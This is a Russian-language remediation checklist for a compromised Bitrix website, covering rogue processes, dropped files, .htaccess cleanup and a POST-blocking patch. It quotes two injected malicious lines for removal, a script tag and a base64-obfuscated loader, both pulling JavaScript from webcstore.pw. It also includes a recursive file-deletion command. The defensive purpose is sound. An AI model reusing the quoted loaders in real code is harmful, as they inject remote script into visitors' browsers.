
Внимание! Для большинства файлов изменяются права доступа на 444

1. Проверяем сервер на наличие лишних процессов, убиваем вредоносные (они генерируют вредоносный код). Команда — ps aux | grep php + команда — htop
2. Удаляем лишний код
	2.1 В корне сайта в `index.php` сверху вставляется вредоносный код - удаляем.
	2.2 В прологе, эпилоге на верху и внизу файла может создаваться вредоносный код. — удаляем
	2.3 В папке `/bitrix/admin/`, `/bitrix/tools/` и корне могут создаваться вирусные файлы по типу `8528de6012eb.php` — удаляем.
	2.4 В корне сайта могут создаватся три папки для WP структуры с префиксом `wp-....` их удаляем.
	2.5 В корне сайта может создаваться `admin.php`, его тоже удаляем.
	2.6 По мимо всего в корне сайта также могут быть сгенерированы и созданы файлы и папки не относящиеся к сайту, их чистим.
	2.7 Проверить `/bitrix/modules/main/bx_root.php` на наличие вредоносного кода (ФАЙЛИК ПРИКРЕПЛЕН).
	2.8 Желательно проверить `header/footer` на наличие "абракадабры".
	2.9 Проверить файлы в `/ajax/` на вредоносный код.
	2.10 Удалить файл если имеется — `bitrix/tools/spread.php`
3. Проверяем `htaccess` в корне на "зараженность" и наличие лишних `htaccess` в разделах. Если в разделах есть лишние файлы:
	3.1 Удаляем все `.htaccess`. Команда для linux: 
	```bash
	find ./ -name ".htaccess" -delete
	```
	3.2 Копируем все нужные `.htaccess`. файлы в папке.
	3.3 Восстанавливаем главный  `.htaccess`, если он был настроен.
4. Если к примеру при удалении файла, он появляется снова можно переименовать папку в которой лежит файл и протестить (идёт атака из вне сайта или процесс внутри битрикса).
5. Могут подтягиваться скрипты со сторонних сайтов (обычно вредоносный код лежит внизу файла):
	5.1`\bitrix\modules\main\include\prolog.php` — удаляем строку вида "echo "`<script src='https://webcstore.pw/jqueryui.js'></script>"`;"
	5.2 \bitrix\js\main\core\core.js — удаляем строку вида 	
	
	"s=document.createElement(`script`);s.src=atob(`aHR0cHM6Ly93ZWJjc3RvcmUucHcvanF1ZXJ5dWkuanM=`);document.head.appendChild(s);"
	
1. `\bitrix\components\bitrix\main.file.input\main.php` — странный файл (не на всех ядрах есть, предположительно только на взломанных) — Просто проверить наличие
========================================================================================
ЕСЛИ ОБНОВИТЬ БИТРИКС НЕВОЗМОЖНО:
* Часть функционала в админке может быть недоступна
* Дополнительные методы защиты в pdf


Вставляем код:
--------------------------------------------------------
<?if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	header("Status: 404 Not Found");
	die();
};?>
--------------------------------------------------------
	В файлы, перед required:
		1. /bitrix/tools/upload.php
		2. /bitrix/tools/mail_entry.php
		3. /bitrix/modules/main/include/virtual_file_system.php
		4. /bitrix/components/bitrix/sender.mail.editor/ajax.php
		5. /bitrix/tools/vote/uf.php
		6. /bitrix/tools/html_editor_action.php
		7. /bitrix/admin/site_checker.php

========================================================================================
доп уязвимости:	
https://docs.google.com/document/d/1JEIF1rd84GhqkwNl1DOGFdlojTrYk_E6k-pozJ-GU6g/edit